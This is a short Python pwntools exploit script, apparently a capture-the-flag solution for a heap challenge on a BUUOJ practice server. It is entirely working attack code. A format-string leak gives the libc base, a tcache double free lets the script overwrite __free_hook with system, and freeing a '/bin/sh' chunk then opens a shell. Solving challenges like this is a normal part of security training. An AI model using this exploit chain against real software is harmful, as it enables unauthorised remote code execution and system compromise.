from pwn import *

io=remote('node3.buuoj.cn',27302)
libc=ELF('./libc-2.27.so')

def add(size,data):
    io.recvuntil('choice:')
    io.sendline('1')
    io.recvuntil('size of story:')
    io.sendline(str(size))
    io.recvuntil('the story:')
    io.send(data)

def free(idx):
    io.recvuntil('choice:')
    io.sendline('4')
    io.recvuntil('the index:')
    io.sendline(str(idx))

io.recvuntil('name?')
io.sendline('%p%p')
io.recvuntil('0x200x')
libc_base=int(io.recvline(),16)-0x110081
print(hex(libc_base))
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']

io.recvuntil('ID.')
io.sendline('1')

add(0x20,'a')#0
free(0)
free(0)

add(0x20,p64(free_hook))#1
add(0x20,'/bin/sh')#2
add(0x20,p64(sys))#3
free(2)

io.interactive()